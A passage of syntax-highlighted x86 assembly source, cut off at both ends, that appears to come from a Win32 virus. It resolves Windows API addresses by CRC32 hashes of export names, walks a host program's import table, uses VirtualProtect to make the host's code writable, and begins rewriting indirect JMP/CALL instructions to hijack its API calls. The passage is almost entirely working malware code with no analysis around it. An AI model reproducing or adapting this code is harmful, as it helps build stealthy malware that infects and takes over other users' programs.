    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">SearchET</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;procedure for recieving API names from Export table</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all registers</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">address_not_found</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get ptr to PE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;make pointer raw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">address_not_found</span><span class="sc0">         </span><span class="sc1">;quit, if no exports</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;get RVA to Export table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;offset to names</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;number of name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">APIname</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get to API name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">                  </span><span class="sc1">;get to the end of API name</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;get size of API name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;to EDI</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;restore ptr to API name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">              </span><span class="sc1">;get its CRC32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get requested CRC32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;is it same</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">mcrc</span><span class="sc0">                 </span><span class="sc1">;yeah</span><span class="sc0">
</span><span class="sc5">nchar</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;no, increment counter</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">APIname</span><span class="sc0">                </span><span class="sc1">;and get next API name</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;clean stack</span><span class="sc0">
</span><span class="sc5">address_not_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;and quit</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endGPA</span><span class="sc0">
</span><span class="sc5">mcrc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;skip over ordinals</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">address_not_found</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get start of function addresses</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;make it pointer to our API</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">               </span><span class="sc1">;address to EAX</span><span class="sc0">
</span><span class="sc5">endGPA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store address</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">


</span><span class="sc5">a_go</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;jump over alignments</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;zero EDX</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_align</span><span class="sc0">                </span><span class="sc1">;no alignments needed</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;align API name</span><span class="sc0">
</span><span class="sc5">end_align</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">PatchIT</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">                </span><span class="sc1">;procedure for patching API calls</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endPIT</span><span class="sc4">&gt;</span><span class="sc0">        </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">itDlta</span><span class="sc0">
</span><span class="sc5">itDelta</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">itDlta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">gmh</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">itDelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get to PE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;make pointer raw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">n_dll</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szK32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">itDelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get Kernel32 name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endPIT</span><span class="sc0">
</span><span class="sc5">sdll</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.ID_Name</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmpsd</span><span class="sc0">                   </span><span class="sc1">;is it K32?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_dll</span><span class="sc0">
    </span><span class="sc6">cmpsd</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_dll</span><span class="sc0">
    </span><span class="sc6">cmpsd</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_dll</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;zero counter</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.ID_OriginalFirstThunk</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get first record</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get first API name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">pit_align</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">a_go</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;store pointer</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">                  </span><span class="sc1">;get to the end of API name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;move size of API name to EDI</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;restore pointer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store EAX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">              </span><span class="sc1">;calculate CRC32 of API name</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;check, if it is requested API</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_ok</span><span class="sc0">                 </span><span class="sc1">;yeah, it is</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;check, if there is next API</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;restore EAX</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pit_align</span><span class="sc0">               </span><span class="sc1">;yeah, check it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endPIT</span><span class="sc0">              </span><span class="sc1">;no, quit</span><span class="sc0">
</span><span class="sc5">a_ok</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;restore EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get address to IAT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;and save it to stack</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;get base address of program</span><span class="sc0">
</span><span class="sc5">gmh</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;get PE header</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NT_OptionalHeader.OH_BaseOfCode</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get base of code</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">                </span><span class="sc1">;normalize</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;to ESI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NT_OptionalHeader.OH_SizeOfCode</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;and its size</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">p_var</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">p_var</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddVirtualProtect</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;set writable right</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endPIT</span><span class="sc0">
</span><span class="sc5">sJMP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get byte from code</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                </span><span class="sc1">;is it JMP/CALL?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">lJMP</span><span class="sc0">                        </span><span class="sc1">;check, if it is          </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">                 </span><span class="sc1">;JMP DWORD PTR [XXXXXXXXh]</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">gIT1</span><span class="sc0">                                                            
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">         </span><span class="sc1">;or CALL DWORD PTR [XXXXXXXXh]</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">lJMP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gIT2</span><span class="sc0">
</span><span class="sc5">gIT1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
</span><span class="sc5">gIT2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">j_or_c</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">itDelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">;change opcode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_Size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
